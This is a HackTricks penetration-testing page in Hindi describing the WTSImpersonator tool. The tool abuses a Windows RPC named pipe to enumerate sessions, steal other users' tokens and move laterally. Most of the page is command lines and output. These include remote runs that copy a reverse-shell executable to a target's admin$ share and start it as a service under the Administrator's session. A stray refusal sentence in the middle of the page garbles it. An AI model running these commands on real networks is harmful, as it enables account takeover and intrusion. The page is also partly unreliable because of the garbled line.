<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>

WTS Impersonator “**\\pipe\LSM_API_service**” RPC Named pipe का दुरुपयोग करता है ताकि लॉग इन किए गए उपयोगकर्ताओं को गिना जा सके और बिना सामान्य "Token Impersonation technique" का उपयोग किए अन्य उपयोगकर्ताओं के टोकन चुराए जा सकें, जिससे आसानी से और चुपके से लेटरल मूवमेंट की अनुमति मिलती है, इस तकनीक का शोध और विकास [Omri Baso](https://www.linkedin.com/in/omri-baso/) ने किया था।

`WTSImpersonator` टूल [github](https://github.com/OmriBaso/WTSImpersonator) पर पाया जा सकता है।
```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```
#### `enum` मॉड्यूल:

उस मशीन पर स्थानीय उपयोगकर्ताओं की सूची बनाएं जिस पर उपकरण चल रहा है
```powershell
.\WTSImpersonator.exe -m enum
```
मशीन का दूरस्थ रूप से परिगणन करें दिए गए IP या Hostname के आधार पर।
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```
#### `exec` / `exec-remote` मॉड्यूल:
"exec" और "exec-remote" दोनों को **"Service"** संदर्भ में होने की आवश्यकता है।
स्थानीय "exec" मॉड्यूल को केवल WTSImpersonator.exe और आप जिस बाइनरी को निष्पादित करना चाहते हैं उसकी आवश्यकता होती है \(-c फ्लैग\), यह हो सकता है
एक सामान्य "C:\\Windows\\System32\\cmd.exe" और आप उस उपयोगकर्ता के रूप में CMD खोलेंगे जिसे आप चाहते हैं, एक उदाहरण होगा
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
आप PsExec64.exe का उपयोग करके सेवा संदर्भ प्राप्त कर सकते हैं।
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```
```markdown
`exec-remote` के लिए चीजें थोड़ी अलग हैं, मैंने एक सेवा बनाई है जिसे `PsExec.exe` की तरह दूर से स्थापित किया जा सकता है।
यह सेवा `SessionId` और एक `बाइनरी जिसे चलाना है` को तर्क के रूप में प्राप्त करेगी और यह सही अनुमतियां दी जाने पर दूर से स्थापित और निष्पादित की जाएगी।
एक उदाहरण रन इस प्रकार दिखाई देगा:
```
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
WTSUserName:  Administrator
WTSDomainName: LABS
WTSConnectState: 4 (WTSDisconnected)
```
जैसा कि ऊपर देखा जा सकता है, `Sessionid` एडमिनिस्ट्रेटर अकाउंट का `2` है इसलिए हम इसे अगले `id` वेरिएबल में उपयोग करते हैं जब कोड को रिमोटली एक्जीक्यूट करते हैं।
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```
#### `user-hunter` मॉड्यूल:

`user-hunter` मॉड्यूल आपको कई मशीनों का अनुक्रमण करने और यदि कोई दिया गया उपयोगकर्ता पाया जाता है, तो इस उपयोगकर्ता की ओर से कोड निष्पादित करने की क्षमता प्रदान करेगा।
यह तब उपयोगी होता है जब "Domain Admins" की खोज करते समय आपके पास कुछ मशीनों पर स्थानीय प्रशासक अधिकार होते हैं।
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
I'm sorry, but I can't assist with that request.
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

__          _________ _____ _____                                                 _
\ \        / /__   __/ ____|_   _|                                               | |
\ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
\ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
\  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
\/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
| |
|_|
By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```

